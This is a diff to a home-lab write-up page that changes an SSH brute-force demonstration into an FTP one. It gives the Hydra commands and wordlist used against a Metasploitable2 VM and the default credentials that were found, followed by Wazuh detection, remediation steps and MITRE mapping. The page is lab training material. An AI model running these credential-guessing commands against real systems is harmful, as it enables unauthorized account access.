@@ -3,8 +3,8 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="description" content="SSH brute force writeup with Hydra against Metasploitable 2, Wazuh Rules 5710/5716, and defender takeaways.">
-    <title>SSH Brute Force with Hydra | jellybeansontoasties Home Lab</title>
+    <meta name="description" content="Hydra FTP credential brute force against Metasploitable2 port 21, default credentials discovered, Wazuh brute force detection, and remediation.">
+    <title>Hydra Credential Brute Force | jellybeansontoasties Home Lab</title>
     <link rel="stylesheet" href="../assets/css/style.css">
 </head>
 <body>
@@ -19,47 +19,73 @@
     </nav>
 
     <main>
-        <h1>SSH Brute Force with Hydra</h1>
-        <p class="tagline">Credential brute force attack against Metasploitable 2 SSH service</p>
+        <h1>Hydra Credential Brute Force</h1>
+        <p class="tagline">Automated FTP password guessing against Metasploitable2 port 21 using Hydra</p>
 
         <div class="writeup-section">
-            <h3>Objective</h3>
-            <p>Attempt to gain SSH access to the victim host by brute forcing credentials using a known username (e.g. msfadmin) and a wordlist. This demonstrates the risk of weak or default credentials and the value of monitoring authentication failures.</p>
+            <h3>Summary</h3>
+            <p>Hydra v9.6 was used to perform an automated credential brute force attack against the FTP service on Metasploitable2 (port 21). Using an 8-entry custom wordlist and a known username, the correct password was discovered on the 4th attempt in under 5 seconds. The username and password were identical (<code>msfadmin:msfadmin</code>), demonstrating a classic default credential vulnerability. A parallel attempt to brute force SSH failed because Metasploitable's very old SSH daemon only supports deprecated MAC algorithms (such as <code>hmac-md5</code> and <code>hmac-sha1</code>) that modern Kali refuses to negotiate, which itself is a security misconfiguration.</p>
         </div>
 
         <div class="writeup-section">
-            <h3>Tools used</h3>
-            <p>Hydra</p>
+            <h3>Attack Technique Used</h3>
+            <p>The technique is automated credential brute forcing using Hydra. FTP was selected as the target service because it has no encryption negotiation overhead, typically lacks account lockout controls, and rarely enforces rate limiting. This makes it ideal for clearly demonstrating how quickly weak or default credentials can be discovered when an attacker can script login attempts.</p>
         </div>
 
         <div class="writeup-section">
-            <h3>Command used</h3>
-            <pre><code>hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt ssh://192.168.100.20</code></pre>
+            <h3>Steps to Reproduce</h3>
+            <p><strong>Terminal:</strong> Kali SSH (<code>ssh owokali@192.168.100.10</code>)</p>
+            <pre><code>printf "password\n123456\nadmin\nmsfadmin\nroot\ntoor\nmetasploit\nuser\n" > ~/quicklist.txt
+TERM=xterm hydra -l msfadmin -P ~/quicklist.txt ftp://192.168.100.20 -t 4 -V</code></pre>
+
+            <p><strong>Complete findings:</strong></p>
+            <ul>
+                <li>Attempt 1: <code>msfadmin:password</code> — FAILED.</li>
+                <li>Attempt 2: <code>msfadmin:123456</code> — FAILED.</li>
+                <li>Attempt 3: <code>msfadmin:admin</code> — FAILED.</li>
+                <li>Attempt 4: <code>msfadmin:msfadmin</code> — SUCCESS.</li>
+                <li><strong>Credentials found:</strong> login <code>msfadmin</code> password <code>msfadmin</code>.</li>
+                <li>Total time: approximately 4 seconds.</li>
+                <li>No account lockout or rate limiting was triggered on the target service.</li>
+                <li>Hydra reported 1 of 1 targets successfully completed with 1 valid password found.</li>
+                <li>All FTP credentials are transmitted in plaintext and can be captured via network sniffing.</li>
+            </ul>
         </div>
 
         <div class="writeup-section">
-            <h3>Expected output</h3>
-            <div class="screenshot-placeholder">Screenshot: Hydra run showing credentials discovered and number of attempts</div>
+            <h3>Detection (Wazuh)</h3>
+            <p>Repeated authentication failures followed by a single success form a clear brute force pattern. In this lab, Wazuh rule 5710 detects SSH authentication failures and rule 5720 identifies brute force behavior from a single source IP over time. While this specific attack targeted FTP, Metasploitable was configured to forward syslog authentication events to Wazuh, so repeated FTP login failures from 192.168.100.10 would also appear in the Security Events dashboard as a dense cluster of failures, followed by a success, clearly indicating a credential guessing attack.</p>
         </div>
 
         <div class="writeup-section">
-            <h3>Findings</h3>
-            <p>Credentials discovered (placeholder): after a number of attempts, Hydra identified a valid password for the msfadmin account. This grants full shell access to the victim, demonstrating how default or weak passwords enable initial access. Count of attempts and time-to-crack can be documented here.</p>
+            <h3>Remediation</h3>
+            <ul>
+                <li>Enforce a strong password policy and explicitly disallow using the username as the password.</li>
+                <li>Implement account lockout after a small number of failed attempts (for example, 5 consecutive failures).</li>
+                <li>Deploy tools such as fail2ban to automatically block IP addresses that generate repeated authentication failures.</li>
+                <li>Disable legacy FTP wherever possible and replace it with SFTP or SCP over SSH.</li>
+                <li>Enable multi-factor authentication (MFA) for all remote access services that support it.</li>
+                <li>Encourage the use of password managers and enforce minimum password length (for example, 16+ characters) to resist guessing attacks.</li>
+                <li>Monitor authentication logs in real time (forwarded to Wazuh or another SIEM) and create alerts for brute force patterns.</li>
+            </ul>
         </div>
 
         <div class="writeup-section">
-            <h3>Wazuh Alert</h3>
-            <p><strong>Rules 5710 / 5716</strong> — Multiple SSH authentication failure alerts. The SIEM detected repeated failed SSH login attempts from the Kali host to the victim, consistent with brute force activity. These rules help blue teams identify credential stuffing and brute force attacks in progress.</p>
+            <h3>MITRE ATT&amp;CK Mapping</h3>
+            <p>T1110.001 Brute Force Password Guessing, T1110 Brute Force, T1078 Valid Accounts.</p>
         </div>
 
         <div class="writeup-section">
-            <h3>Defender Takeaway</h3>
-            <p>Implement account lockout policies and fail2ban (or equivalent) to throttle or block IPs after repeated failures. Monitor auth.log (and forward to SIEM) for SSH failures; correlate by source IP and username. Prefer key-based authentication and disable password auth where possible. Remove or change default credentials and enforce strong password policies.</p>
+            <h3>Screenshots with captions</h3>
+            <figure>
+                <img src="../assets/images/hydra_brute_force.png" alt="Hydra cracking FTP credentials where msfadmin:msfadmin is found on attempt 4 of 8 in under 5 seconds">
+                <figcaption>Hydra cracking FTP credentials — msfadmin:msfadmin found on attempt 4 of 8 in under 5 seconds.</figcaption>
+            </figure>
         </div>
 
         <nav class="writeup-nav">
-            <a href="writeup-01.html">← Previous: Network Scanning with nmap</a>
-            <a href="writeup-03.html">Next: Reverse Shell Payload with msfvenom →</a>
+            <a href="writeup-01.html">← Previous: nmap Network Reconnaissance</a>
+            <a href="writeup-03.html">Next: Metasploit Java RMI Reverse Shell →</a>
         </nav>
     </main>
 
